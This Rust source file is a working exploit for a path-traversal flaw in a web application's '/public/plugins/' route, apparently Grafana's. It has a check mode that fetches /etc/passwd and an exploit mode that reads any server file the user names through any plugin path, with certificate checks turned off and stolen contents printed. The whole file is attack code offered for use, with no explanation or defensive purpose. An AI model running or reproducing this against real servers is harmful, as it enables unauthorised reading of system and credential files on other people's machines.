use reqwest::ClientBuilder;
use reqwest::Error;
use reqwest::header;
use colorful::{Color, Colorful};
use std::fs;
use std::time::Duration;

#[tokio::main]
pub async fn checkvuln(host: String, plugin: String, filename: String, nossl: bool, check: bool) -> Result<(), Error> {

    let mut headers = header::HeaderMap::new();
    headers.insert("Content-Length", header::HeaderValue::from_static("0"));
    
    if check == true {
        let url1;
        if nossl == true {
            url1 = format!("http://{}/public/plugins/graph/../../../../../../../../etc/passwd", host);
        } else {
            url1 = format!("https://{}/public/plugins/graph/../../../../../../../../etc/passwd", host);
        }
     
        // Testing 1st URL using get method
        println!("[+] Checking url: {}",url1);
        let client = ClientBuilder::new().danger_accept_invalid_certs(true).timeout(Duration::from_secs(2)).build()?;
        let response = client.get(&url1).send().await?;

        if response.status().is_success() {
            let body = response.text().await?;
            if body.contains("root:x:0:0") {
                println!("{}", "  [+] Host is Vulnerable\n".color(Color::Red).bold());
                println!("{}",body);
            } else {
            println!("{}", "  [-] Not Vulnerable\n".color(Color::Green));
            }       
        } else if response.status().is_server_error() {
            println!("  [-] Server Error!")
        } else {
            let body = response.text().await?;
            if body.contains("root:x:0:0") {
                println!("{}", "  [+] Host is Vulnerable\n".color(Color::Red).bold());
                println!("{}",body);
            } else {
            println!("{}", "  [-] Not Vulnerable\n".color(Color::Green));
            }
        }

    // if not checking but exploiting
    } else {
    
        let url1;
        if nossl == true {
            url1 = format!("http://{}/public/plugins/{}/../../../../../../../..{}", host, plugin, filename);
        } else {
            url1 = format!("https://{}/public/plugins/{}/../../../../../../../..{}", host, plugin, filename);
        }
     
        // Testing 1st URL using get method
        println!("[+] Checking url: {}",url1);
        let client = ClientBuilder::new().danger_accept_invalid_certs(true).timeout(Duration::from_secs(2)).build()?;
        let response = client.get(&url1).send().await?;

        if response.status().is_success() {
            let body = response.text().await?;
            if body.contains("root:x:0:0") {
                println!("{}", "  [+] Host is Vulnerable\n".color(Color::Red).bold());
                println!("{}", body.to_string());
            } else {
            println!("{}", "  [-] Not Vulnerable\n".color(Color::Green));
            }       
        } else if response.status().is_server_error() {
            println!("  [-] Server Error!")
        } else {
            let body = response.text().await?;
            if body.contains("root:x:0:0") {
                println!("{}", "  [+] Host is Vulnerable\n".color(Color::Red).bold());
                println!("{}", body.to_string());
            } else {
            println!("{}", "  [-] Not Vulnerable\n".color(Color::Green));
            }
        }

    }
   
    Ok(())
}

pub fn file_to_string(filename: String) -> String {
    let data = fs::read_to_string(filename).expect("Unable to read file");
    data
}
